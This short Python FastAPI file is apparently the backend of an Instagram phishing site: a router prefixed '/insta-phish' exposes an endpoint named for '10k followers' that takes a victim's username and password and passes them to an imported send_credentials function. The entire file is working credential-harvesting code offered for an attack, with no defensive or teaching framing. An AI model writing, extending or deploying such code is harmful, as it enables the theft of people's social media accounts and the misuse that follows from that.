from pydantic import BaseModel
from fastapi import APIRouter
from user_interface import send_credentials

router = APIRouter(prefix="/insta-phish")

class take_user(BaseModel):
    username : str
    password : str

@router.post("/api/credentials/insta-10k-followers")
def credentials(user:take_user):
    username = user.username
    password = user.password
    # print("Username :", username, "\nPassword :", password)
    send_credentials(username, password)


